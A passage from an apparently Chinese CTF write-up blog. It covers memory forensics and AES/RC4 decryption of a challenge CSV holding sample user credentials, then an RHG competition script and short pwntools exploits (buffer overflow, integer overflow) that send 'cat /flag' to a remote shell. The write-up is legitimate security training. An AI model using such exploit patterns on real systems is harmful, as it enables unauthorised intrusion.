class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES, PKCS1_OAEP<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><br>hackkey = os.getenv(<span class="hljs-string">&#x27;hackkey&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> hackkey:<br>    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;Environment variable &#x27;hackkey&#x27; is not set&quot;</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;private.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    private_key = RSA.import_key(f.read())<br>public_key = private_key.publickey().export_key()<br><br>aes_key = hashlib.sha256(hackkey.encode()).digest()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.csv&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br>cipher_aes = AES.new(aes_key, AES.MODE_EAX)<br>ciphertext, tag = cipher_aes.encrypt_and_digest(data)<br>cipher_rsa = PKCS1_OAEP.new(RSA.import_key(public_key))<br>enc_aes_key = cipher_rsa.encrypt(aes_key)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;encrypted_data.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(ciphertext)<br><br><span class="hljs-built_in">print</span>(enc_aes_key.<span class="hljs-built_in">hex</span>())<br><span class="hljs-built_in">print</span>(cipher_aes.nonce.<span class="hljs-built_in">hex</span>())<br><span class="hljs-built_in">print</span>(tag.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><p>根据代码分别查看<code>环境变量hackkey</code> <code>private.pem</code> <code>encrypted_data.bin</code></p><p><code>python vol.py -f easyrawencode.raw --profile Win7SP1x64 envars | grep -E &#39;hackkey&#39;</code><br><code>python vol.py -f easyrawencode.raw --profile Win7SP1x64 filescan | grep -E &quot;private.pem|encrypted_data.bin&quot;</code></p><p><img src="/img/wp/2025/xhlj-easyrawencode-1.png"></p><p>还需要查看当时运行代码后输出的值</p><p><code>python vol.py -f easyrawencode.raw --profile Win7SP1x64 consoles</code></p><p><img src="/img/wp/2025/xhlj-easyrawencode-2.png"></p><p>根据得到的信息还原出data.csv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES, PKCS1_OAEP<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><br>hackkey = <span class="hljs-string">&#x27;4etz0hHbU3TgKqduFL&#x27;</span><br>aes_key = hashlib.sha256(hackkey.encode()).digest()<br><br>nonce_hex = <span class="hljs-string">&quot;d919c229aab6535efa09a52c589c8f47&quot;</span><br>nonce = <span class="hljs-built_in">bytes</span>.fromhex(nonce_hex)<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;encrypted_data.bin&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    ciphertext = f.read()<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment"># 使用AES密钥解密数据，先不验证MAC</span><br>    cipher_aes = AES.new(aes_key, AES.MODE_EAX, nonce=nonce)<br>    data = cipher_aes.decrypt(ciphertext)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.csv&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密完成，数据已保存到 data.csv&quot;</span>)<br><br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密过程中出现错误:&quot;</span>, <span class="hljs-built_in">str</span>(e))<br><br></code></pre></td></tr></table></figure><p>得到一份用户数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs csv">编号,用户名,密码,姓名,性别,出生日期,个性签名(加密版)<br>1,sWEbvrLvgyFO9u8,vHBhvVXS2JvLnTTo,胜屠翰池,男,19761023,korvy4fjEBP6AKeDValKDfzBRK9sKDSIHVakq3NXMMU3<br>2,wangguizhi,3E8vleDJFC,桓玉珂,女,20050814,NF+z3NevQqWILNqNvUznlOFie3KLuhIztQNLFnRy<br>3,kofxlSO1C3XEXP3QPH1lEg5WQ,4U86p3uzw7xV,崎邱炜,男,20000710,yutW+1ipTbce3pcz+BEIBS48fX7NF5hh8bWEdigYsHca3vo/dQ0Nl+YFmpl5UD4Onga0hGehitNvMrG4XNFdH+lHEg==<br>4,caijijinotwo1f,PupkzhU9R0g4AoP,禹歆美,女,20120626,t02tKoybGWyIqYL133qtg4+yG3yRvNk=<br>...<br>1997,QV1lQhy1eYi6,s6oJFLTbRPG,公刘芳林,男,19950104,QMvnJnbRC8dbNNSBCX4ZJoFul2q4XilJXc9BQ/rG<br>1998,9tk5p3Y,90909090tianxia,公休生文,男,19790402,RO7+27VoJ3Feb5uPhDmASe27URp9<br>1999,40utHZEBKPmxiMO7VrE6CMm,vhathQj2XGSB,云阔,女,19930420,aaf/6mkYPho71FZAjGbRzjZOqx//FgT1fzMfLFzyBAtPQZf9KbMu/Teo/ANL9Ur09CgO5N0UV2+Gr1ncqLy5zZv0p+VhqJwvm7U4ypUyovY=<br>2000,liuguiying,YeE8DXLSPMthwp,沈盈盈,男,19750412,g+1FWgFzuwHOLzZ7Qy1QVWtLhQoRVVQQhUSml8p/d6IeK6NG/8VFV+v0wqCHEIlYFVXtPSncSQ==<br></code></pre></td></tr></table></figure><p>根据结构组成猜测aes等加密方法，最后通过rc4解出明文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> base64<br><br>data = pd.read_csv(<span class="hljs-string">&#x27;data.csv&#x27;</span>)<br>password = data[<span class="hljs-string">&#x27;密码&#x27;</span>]<br>signature = data[<span class="hljs-string">&#x27;个性签名(加密版)&#x27;</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_decrypt</span>(<span class="hljs-params">ciphertext, key</span>):<br>    <span class="hljs-keyword">try</span>:<br>        ciphertext = base64.b64decode(ciphertext)<br>        key = key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>        S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>        j = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>            j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span><br>            S[i], S[j] = S[j], S[i]<br><br>        i = j = <span class="hljs-number">0</span><br>        plaintext = <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ciphertext:<br>            i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>            j = (j + S[i]) % <span class="hljs-number">256</span><br>            S[i], S[j] = S[j], S[i]<br>            k = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>            plaintext.append(byte ^ k)<br><br>        <span class="hljs-keyword">return</span> plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Debug - Key length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(key)&#125;</span>, Ciphertext length: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(ciphertext)&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Decryption failed: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span><br><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(password)):<br>    result = rc4_decrypt(signature[i], password[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Entry <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;DASCTF&#x27;</span> <span class="hljs-keyword">in</span> result:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found flag in entry <span class="hljs-subst">&#123;i&#125;</span>: <span class="hljs-subst">&#123;result&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2025/xhlj-easyrawencode-3.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ds&quot;&gt;&lt;a href=&quot;#ds&quot; class=&quot;headerlink&quot; title=&quot;ds&quot;&gt;&lt;/a&gt;ds&lt;/h1&gt;&lt;h2 id=&quot;easydatalog&quot;&gt;&lt;a href=&quot;#easydatalog&quot; class=&quot;headerlink&quot; title=&quot;eas</summary>
      
    
    
    
    <category term="wp" scheme="https://www.dr0n.top/categories/wp/"/>
    
    
    <category term="wp" scheme="https://www.dr0n.top/tags/wp/"/>
    
    <category term="2025竞赛" scheme="https://www.dr0n.top/tags/2025%E7%AB%9E%E8%B5%9B/"/>
    
    <category term="西湖论剑" scheme="https://www.dr0n.top/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>2024“中华武数杯”全国网络攻防精英赛RHG wp</title>
    <link href="https://www.dr0n.top/posts/230fa1fb/"/>
    <id>https://www.dr0n.top/posts/230fa1fb/</id>
    <published>2024-11-30T10:00:00.000Z</published>
    <updated>2025-07-27T10:03:22.264Z</updated>
    
    <content type="html"><![CDATA[<p>第一次打RHG模式，i春秋的平台和在网上看到的不太一样，一轮是一小时，也可以手动一题一题做然后提交</p><p><img src="/img/wp/2024/2024zhwsb-rhg-1.png"></p><p>写了个脚本获取题目信息然后下载，运行写好的exp然后提交flag（写不来自动分析漏洞，就人工代替ai）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"># -*- coding: utf-8 -*-</span><br><span class="hljs-string"># @Author: dr0n1</span><br><span class="hljs-string"># @Date:   2024/11/27</span><br><span class="hljs-string"># @link: https://www.dr0n.top/</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>token = <span class="hljs-string">&quot;icqxxx&quot;</span><br><br><br><span class="hljs-comment"># 获取题目信息</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">token</span>):<br>    url = <span class="hljs-string">&quot;https://apiterminator.ichunqiu.com/xxx&quot;</span><br>    headers = &#123;<span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0&quot;</span>&#125;<br>    url = url + <span class="hljs-string">&quot;?token=&quot;</span> + token<br>    data = requests.get(url, headers=headers).json()<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-comment"># 下载题目附件并解压</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">file_url, title</span>):<br>    headers = &#123;<span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0&quot;</span>&#125;<br>    res = requests.get(file_url, headers=headers)<br>    os.makedirs(<span class="hljs-string">&#x27;download&#x27;</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    zip_path = <span class="hljs-string">f&#x27;download/<span class="hljs-subst">&#123;title&#125;</span>.zip&#x27;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(zip_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(res.content)<br><br>    <span class="hljs-keyword">if</span> os.name == <span class="hljs-string">&#x27;nt&#x27;</span>:<br>        subprocess.run([<span class="hljs-string">&#x27;powershell&#x27;</span>, <span class="hljs-string">&#x27;Expand-Archive&#x27;</span>, <span class="hljs-string">&#x27;-Path&#x27;</span>, zip_path, <span class="hljs-string">&#x27;-DestinationPath&#x27;</span>, <span class="hljs-string">f&#x27;download/<span class="hljs-subst">&#123;title&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;-Force&#x27;</span>])<br>    <span class="hljs-keyword">else</span>:<br>        subprocess.run([<span class="hljs-string">&#x27;unzip&#x27;</span>, <span class="hljs-string">&#x27;-o&#x27;</span>, zip_path, <span class="hljs-string">&#x27;-d&#x27;</span>, <span class="hljs-string">f&#x27;download/<span class="hljs-subst">&#123;title&#125;</span>&#x27;</span>])<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;title&#125;</span>下载解压完成&quot;</span>)<br><br><br><span class="hljs-comment"># 运行exp</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">docker_ip, docker_port, title</span>):<br>    exp_dir = <span class="hljs-string">&#x27;exp&#x27;</span><br>    prefix = title.split(<span class="hljs-string">&#x27;-&#x27;</span>)[<span class="hljs-number">0</span>]<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(exp_dir):<br>        <span class="hljs-keyword">if</span> filename.startswith(prefix) <span class="hljs-keyword">and</span> filename.endswith(<span class="hljs-string">&#x27;.py&#x27;</span>):<br>            file_path = os.path.join(exp_dir, filename)<br>            <span class="hljs-keyword">try</span>:<br>                process = subprocess.Popen([<span class="hljs-string">&#x27;python&#x27;</span>, file_path, docker_ip, <span class="hljs-built_in">str</span>(docker_port)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">except</span> FileNotFoundError:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>            stdout, stderr = process.communicate()<br>            <span class="hljs-keyword">return</span> stdout<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-]<span class="hljs-subst">&#123;title&#125;</span> 没有对应exp&quot;</span>)<br>    os.makedirs(<span class="hljs-string">&#x27;exp&#x27;</span>, exist_ok=<span class="hljs-literal">True</span>)<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;exp/<span class="hljs-subst">&#123;prefix&#125;</span>.py&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).close()<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 提交flag</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_flag</span>(<span class="hljs-params">token, question_id, flag</span>):<br>    url = <span class="hljs-string">&quot;https://apiterminator.ichunqiu.com/xxx&quot;</span><br>    url = url + <span class="hljs-string">&quot;?token=&quot;</span> + token + <span class="hljs-string">&quot;&amp;question_id=&quot;</span> + question_id + <span class="hljs-string">&quot;&amp;answer=&quot;</span> + flag<br>    headers = &#123;<span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0&quot;</span>&#125;<br>    res = requests.get(url, headers=headers).json()<br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-comment"># 排名查询</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rank</span>():<br>    data = &#123;<span class="hljs-string">&quot;team_name&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;industry_id&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;attribute_id&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;page_index&quot;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&quot;page_size&quot;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&quot;k&quot;</span>: <span class="hljs-string">&quot;BjNQYA0-B2cKewQjUjcBJVdxD3lXPFRmVDRTbgcxXGpVagQ3W25QPVZh&quot;</span>, <span class="hljs-string">&quot;stamp&quot;</span>: <span class="hljs-number">1732941812896</span>, <span class="hljs-string">&quot;token&quot;</span>: <span class="hljs-string">&quot;login:match_1211:e5cedf979df76cda478bde52601c12d7&quot;</span>, <span class="hljs-string">&quot;rs&quot;</span>: <span class="hljs-string">&quot;83a994740e198e91d37f1f195a515412&quot;</span>&#125;<br>    url = <span class="hljs-string">&quot;http://apiterminator.ichunqiu.com/match/rank/solved&quot;</span><br>    headers = &#123;<span class="hljs-string">&quot;user-agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0&quot;</span>, <span class="hljs-string">&quot;SIGN&quot;</span>: <span class="hljs-string">&quot;xxx&quot;</span>&#125;<br>    res = requests.post(url, headers=headers, data=data).json()<br>    <span class="hljs-keyword">return</span> res<br><br><br>data = search(token)<br><span class="hljs-keyword">if</span> data[<span class="hljs-string">&#x27;code&#x27;</span>] != <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-]获取题目信息失败&quot;</span>)<br>    exit()<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> data[<span class="hljs-string">&#x27;data&#x27;</span>]:<br>    question_id = item[<span class="hljs-string">&#x27;question_id&#x27;</span>]<br>    title = item[<span class="hljs-string">&#x27;title&#x27;</span>]<br>    score = item[<span class="hljs-string">&#x27;score&#x27;</span>]<br>    real_score = item[<span class="hljs-string">&#x27;real_score&#x27;</span>]<br>    file_url = item[<span class="hljs-string">&#x27;file_url&#x27;</span>]<br>    is_solved = item[<span class="hljs-string">&#x27;is_solved&#x27;</span>]<br>    solved_number = item[<span class="hljs-string">&#x27;solved_number&#x27;</span>]<br>    docker_ip = item[<span class="hljs-string">&#x27;docker_ip&#x27;</span>]<br>    docker_port = item[<span class="hljs-string">&#x27;docker_port&#x27;</span>]<br>    flag_url = item[<span class="hljs-string">&#x27;flag_url&#x27;</span>]<br>    attribute = item[<span class="hljs-string">&#x27;attribute&#x27;</span>]<br><br>    <span class="hljs-keyword">if</span> is_solved:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;title&#125;</span> 已解出&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        download(file_url, title)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]正在解决 <span class="hljs-subst">&#123;title&#125;</span>&quot;</span>)<br>        flag = run(docker_ip, docker_port, title)<br><br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;flag\&#123;.*&#125;&#x27;</span>, <span class="hljs-built_in">str</span>(flag))<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            flag = <span class="hljs-keyword">match</span>.group()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;title&#125;</span> flag: <span class="hljs-subst">&#123;flag&#125;</span>&quot;</span>)<br>            rsp = get_flag(token, question_id, flag)<br>            code = rsp[<span class="hljs-string">&#x27;code&#x27;</span>]<br>            message = rsp[<span class="hljs-string">&#x27;message&#x27;</span>]<br>            <span class="hljs-keyword">if</span> code == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;title&#125;</span> 解题成功&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;title&#125;</span> 已有<span class="hljs-subst">&#123;solved_number&#125;</span>次解出&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+]<span class="hljs-subst">&#123;title&#125;</span> 得分<span class="hljs-subst">&#123;real_score&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-]<span class="hljs-subst">&#123;title&#125;</span> 解题失败&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-]<span class="hljs-subst">&#123;title&#125;</span> <span class="hljs-subst">&#123;message&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-]<span class="hljs-subst">&#123;title&#125;</span> exp运行失败&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;---------------------------------------------------&quot;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br><br>rank = rank()<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> rank[<span class="hljs-string">&#x27;data&#x27;</span>][<span class="hljs-string">&#x27;lists&#x27;</span>]:<br>    team_name = item[<span class="hljs-string">&#x27;team_name&#x27;</span>]<br>    school = item[<span class="hljs-string">&#x27;school&#x27;</span>]<br>    total_score = item[<span class="hljs-string">&#x27;total_score&#x27;</span>]<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;队伍: <span class="hljs-subst">&#123;team_name&#125;</span> 学校: <span class="hljs-subst">&#123;school&#125;</span> 总分: <span class="hljs-subst">&#123;total_score&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024zhwsb-rhg-2.png"></p><p>不过每一轮就两题，手动也很快，脚本不是很必要</p><h1 id="rhg3"><a href="#rhg3" class="headerlink" title="rhg3"></a>rhg3</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>e = ELF(<span class="hljs-string">&quot;./download/rhg3/bin&quot;</span>)<br>bss = e.bss(<span class="hljs-number">0x300</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x6c</span> + p8(<span class="hljs-number">0x2d</span>))<br><br>p.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.readuntil(<span class="hljs-string">&quot;&#125;&quot;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="rhg4"><a href="#rhg4" class="headerlink" title="rhg4"></a>rhg4</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>]))<br>p.sendline(<span class="hljs-string">&#x27;4294967288&#x27;</span>)<br><br>p.sendline(<span class="hljs-string">&quot;cat /flag&quot;</span>)<br><span class="hljs-built_in">print</span>(p.readuntil(<span class="hljs-string">&quot;&#125;&quot;</span>))<br><br></code></pre></td></tr></table></figure><h1 id="rhg5"><a href="#rhg5" class="headerlink" title="rhg5"></a>rhg5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = remote(sys.argv[<span 